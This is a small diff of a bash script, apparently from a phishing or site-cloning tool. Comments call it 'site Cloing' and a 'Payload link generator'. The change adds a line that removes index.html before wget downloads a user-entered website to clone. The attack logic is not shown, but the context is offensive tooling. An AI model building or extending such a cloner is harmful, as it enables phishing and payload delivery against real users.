@@ -133,6 +133,7 @@ rm -rf ip.txt
 #site Cloing
 echo -en "\e[1;31m[\e[0m\e[1;37m STOP MUST FILL \e[0m\e[1;31m]\e[0m\e[1;92m \e[1;31m[\e[0m\e[1;37mOk\e[0m\e[1;31m]\e[0m\e[1;92m Enter the WebSite [Http/https://abc.com/abc.com]? :"
 read webb
+rm index.html
 wget $webb -q
 #site Cloing ends
 #end Payload link generator
